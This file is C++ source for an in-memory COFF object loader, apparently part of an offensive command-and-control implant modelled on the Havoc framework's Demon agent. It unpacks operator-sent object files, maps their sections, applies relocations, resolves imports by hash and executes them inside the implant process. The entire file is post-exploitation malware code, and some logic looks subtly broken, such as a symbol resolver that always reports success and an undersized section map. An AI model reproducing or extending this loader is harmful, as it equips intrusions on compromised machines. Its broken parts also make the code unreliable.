#include <core/include/objects.hpp>
namespace Objects {

    BOOL ResolveSymbol(_executable *object, const char* entry_name, uint32_t type, void** function) {
        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c
        HEXANE

        bool success = true;

        *function = nullptr;
        auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));

        if (!(*function = C_PTR(Memory::Methods::GetInternalAddress(hash)))){

        }
        /*
         * else if (IsImport() && !IncludesLib())
         * else if (IsImport())
         */

        defer:
        return success;
    }

    SIZE_T GetFunctionMapSize(_executable *object) {
        HEXANE

        _symbol     *symbol         = { };
        char        *symbol_name    = { };

        char        buffer[9]       = { };
        uint32_t    n_funcs         = 0;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section    = SECTION_HEADER(object->buffer, sec_index);
            object->reloc      = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);

                } else {
                    x_memset(buffer, 0, sizeof(buffer));
                    x_memcpy(buffer, symbol->First.Name, 8);

                    symbol_name = buffer;
                }
                if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    n_funcs++;
                }

                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * n_funcs;
    }

    BOOL BaseRelocation(_executable *object) {
        HEXANE

        char        symbol_name[9]  = { };
        char        *entry_name     = { };
        _symbol     *symbol         = { };
        void        *function       = { };

        bool        success         = true;
        uint32_t    count           = 0;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section     = SECTION_HEADER(object->buffer, sec_index);
            object->reloc       = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];

                } else {
                    x_memset(symbol_name, 0, sizeof(symbol_name));
                    x_memcpy(symbol_name, symbol->First.Name, 8);

                    entry_name = symbol_name;
                }

                void *target    = object->sec_map[symbol->SectionNumber - 1].address;
                void *reloc     = object->sec_map[rel_index].address + object->reloc->VirtualAddress;
                void *map       = object->fn_map + sizeof(void*) * count;

                if (!ResolveSymbol(object, entry_name, symbol->Type, &function)) {
                    success_(false);
                }

                if (function)
#ifdef _WIN64
                {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                        *R_CAST(void**, map)     = function;
                        *S_CAST(uint32_t*, reloc)   = U_PTR(function) - U_PTR(reloc) - sizeof(uint32_t);

                        count++;
                    }
                } else {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32 || object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 4;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;

                    } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                        *S_CAST(uint64_t*, reloc) = *S_CAST(uint64_t*, reloc) + U_PTR(target);

                    }
                }
#else
                {
                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                            *S_CAST(void**, map)        = function;
                            *S_CAST(uint32_t*, reloc)   = U_PTR(map);

                            count++;
                        }
                    } else {
                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                        } else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target);
                        }
                    }
#endif
                object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc)  + sizeof(_reloc)));
            }
        }

        defer:
        return success;
    }

    BOOL MapSections(_executable *object, const uint8_t *const data) {
        HEXANE

        uint8_t *next = { };

        object->fn_map->size    = GetFunctionMapSize(object);
        object->sec_map         = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));

        x_assert(object->sec_map);

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(data, sec_index);
            object->size    = R_CAST(size_t, PAGE_ALIGN(object->size)) + object->section->SizeOfRawData;
        }

        object->size += object->fn_map->size;
        x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        next = object->buffer;
        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section                     = SECTION_HEADER(object->buffer, sec_index);
            object->sec_map[sec_index].size     = object->section->SizeOfRawData;
            object->sec_map[sec_index].address  = next;

            next += object->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            x_memcpy(object->sec_map[sec_index].address, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
        }

        object->fn_map = R_CAST(_object_map*, next);

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            return false;
        }

        return true;
    }

    VOID LoadObject(_parser parser) {
        HEXANE

        char        *entrypoint = { };
        uint8_t     *data       = { };
        uint8_t     *args       = { };

        uint32_t    arg_size    = 0;
        uint32_t    req_id      = 0;
        _executable *object     = { };

        // object execute is : in/out, pid, tid, msg_type, entrypoint, img_data, img_args
        entrypoint  = Parser::UnpackString(&parser, nullptr);
        data        = Parser::UnpackBytes(&parser, nullptr);
        args        = Parser::UnpackBytes(&parser, &arg_size);
        object      = Memory::Methods::CreateImageData(B_PTR(data));

        object->next    = Ctx->coffs;
        Ctx->coffs      = object;

        x_assert(Opsec::ImageCheckArch(object));
        x_assert(Objects::MapSections(object, data));
        x_assert(Objects::BaseRelocation(object));
        x_assert(Memory::Execute::ExecuteObject(object, entrypoint, R_CAST(char*, args), arg_size, req_id));

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, &object);
        }
    }
}
